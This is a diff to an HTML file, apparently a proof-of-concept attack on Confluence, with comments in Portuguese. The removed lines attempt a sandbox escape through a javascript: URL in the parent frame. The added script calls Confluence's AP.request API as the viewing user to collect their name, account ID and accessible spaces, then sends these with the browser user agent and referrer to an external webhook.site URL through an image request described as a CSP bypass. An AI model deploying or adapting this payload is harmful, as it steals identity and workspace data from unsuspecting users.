@@ -1,6 +1,32 @@
-<script>
-// Tentar quebrar sandbox via referrer
-if (window.parent !== window) {
-  window.parent.location = 'javascript:alert(1)';
-}
-</script>
+<!DOCTYPE html>
+<html>
+<body>
+  <script>
+    // Passo 1: Acessar API do Confluence como o usuário que visualiza a página
+    AP.request('/rest/api/user/current', {
+      success: function(userData) {
+        var user = JSON.parse(userData);
+        
+        // Passo 2: Listar espaços que o usuário tem acesso
+        AP.request('/rest/api/space?limit=5', {
+          success: function(spacesData) {
+            
+            // Passo 3: Exfiltrar tudo via Image (bypass CSP)
+            var payload = {
+              timestamp: new Date().toISOString(),
+              user: user.displayName,
+              accountId: user.accountId,
+              spaces: spacesData,
+              userAgent: navigator.userAgent,
+              referrer: document.referrer
+            };
+            
+            new Image().src = 'https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?stolen=' + 
+              encodeURIComponent(JSON.stringify(payload));
+          }
+        });
+      }
+    });
+  </script>
+</body>
+</html>
